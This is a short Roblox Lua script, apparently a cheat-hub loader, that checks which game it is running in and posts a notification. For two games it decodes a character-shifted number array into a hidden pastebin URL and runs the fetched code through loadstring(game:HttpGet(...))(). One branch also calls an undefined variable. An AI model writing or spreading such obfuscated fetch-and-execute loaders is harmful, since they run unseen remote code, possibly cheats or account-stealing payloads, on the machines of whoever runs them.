local sg = game:GetService("StarterGui")
local p = game.PlaceId

local function x(t)
    local r = {}
    
    for i,v in ipairs(t) do
        r[i] = utf8.char(v - 3)
    end
    
    return table.concat(r)
end

if p == 14476003462 then

    sg:SetCore("SendNotification",{
        Title = "Success",
        Text = "Game 1 Supported",
        Duration = 3
    })

    local a = {
        107,119,119,115,118,61,50,50,115,100,118,119,104,101,108,113,49,
        102,114,112,50,117,100,122,50,89,120,69,124,56,60,91,71
    }

    loadstring(game:HttpGet(x(a)))()

elseif p == 116387287343653 then

    sg:SetCore("SendNotification",{
        Title = "Success",
        Text = "Game 2 Supported",
        Duration = 3
    })

    local b = {
        107,119,119,115,118,61,50,50,115,100,118,119,104,101,108,113,49,
        102,114,112,50,117,100,122,50,101,60,100,122,56,118,81,60
    }

    loadstring(game:HttpGet(x(b)))()

    elseif p == 14451515684 then

    sg:SetCore("SendNotification", {
        Title = "Info",
        Text = "Sorry if there is Unavailable",
        Duration = 4
    })

    elseif p == 110280222997707 then

    StarterGui:SetCore("SendNotification", {
        Title = "Info",
        Text = "Lobby Not Supported",
        Duration = 4
    })    

else

    sg:SetCore("SendNotification",{
        Title = "Not Support",
        Text = "Game Not Supported",
        Duration = 5
    })

end
